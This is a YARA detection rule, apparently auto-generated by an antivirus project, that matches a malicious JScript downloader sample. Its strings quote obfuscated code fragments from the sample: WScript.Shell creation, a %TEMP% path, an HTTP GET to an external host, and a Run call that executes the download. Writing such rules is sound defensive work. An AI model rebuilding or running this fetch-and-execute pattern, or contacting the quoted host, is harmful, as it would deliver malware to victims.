rule sig_20160427_6c9751dbd20b9a63f48686ca69acfca1 {
  meta:
    description = "datamaliciousorder - file 20160427_6c9751dbd20b9a63f48686ca69acfca1.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "7e5f4851383ad3cb2cba784e13b723a86c44116e0846d0278ad6237e63f1323b"

  strings:
    $s1  = "function QsghhMevox() {return VxwziNkygz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"rLmXTGm" ascii
    $s2  = "function QsghhMevox() {return VxwziNkygz[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"rLmXTGm" ascii
    $s3  = "function TtwkuNjszh(MthsgQlwnq, MqfoeEpfcb){NlyfpMxcwx = NlyfpMxcwx * 1; return MthsgQlwnq - MqfoeEpfcb;};" fullword ascii
    $s4  = "var VxwziNkygz = function FcgutVmzgx() {return JesgzDhmmd[MngdmUamnu](\"WScript\"+\".Shell\");}(), OcdrtHprti = 11;" fullword ascii
    $s5  = "var JesgzDhmmd = this[\"WScript\"];" fullword ascii
    $s6  = "function FrlcgZfidq(){return RwyntMafyp + \"\";};" fullword ascii
    $s7  = "if (KzrwwMnugj[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "KzrwwMnugj[KbmbuZpllb](\"G\" + \"ET\", \"http://ca-cargo.sk/asl9ks\", false);" fullword ascii
    $s9  = "function BznyrEhenp() {return ((GjhmwAfogc == true) && (GjhmwAfogc == NmtwmElriw)) ? 1 : NlyfpMxcwx;};" fullword ascii
    $s10 = "function SrqjvTbimw(){return MngdmUamnu;};" fullword ascii
    $s11 = "var BifznBjbab = false;" fullword ascii
    $s12 = "var NinhkBfkod = new this[\"D\"+\"ate\"]();" fullword ascii
    $s13 = "function VhhaiDddim()" fullword ascii
    $s14 = "var NmtwmElriw = false;" fullword ascii
    $s15 = "return TtwkuNjszh(AbznnMbuxk, PmvciFhmvk);" fullword ascii
    $s16 = "function HmmsqAddaj(HvbgpMfqgi) {var WknraVhmri = (1, 2, 3, 4, 5, HvbgpMfqgi); return WknraVhmri;};" fullword ascii
    $s17 = "NmtwmElriw = true; " fullword ascii
    $s18 = "}while (GggzeSllna);" fullword ascii
    $s19 = "function ZrqdwLtlip(DvetoUesce){VxwziNkygz[\"R\"+\"un\"](DvetoUesce, NlyfpMxcwx, NlyfpMxcwx);};" fullword ascii
    $s20 = "BifznBjbab = true;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}